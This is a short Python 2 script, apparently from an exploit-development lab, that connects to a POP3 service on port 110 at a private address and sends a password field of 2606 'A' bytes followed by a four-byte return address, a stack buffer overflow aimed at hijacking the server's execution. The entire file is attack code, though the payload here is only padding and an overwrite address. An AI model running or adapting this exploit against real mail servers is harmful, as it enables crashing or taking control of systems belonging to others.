#!/usr/bin/python
import sys, socket


shellcode = "A" * 2606 + "\x8f\x35\x4a\x5f"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.10.178',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + shellcode + '\r\n')
except:
	print "Error Connecting to server"
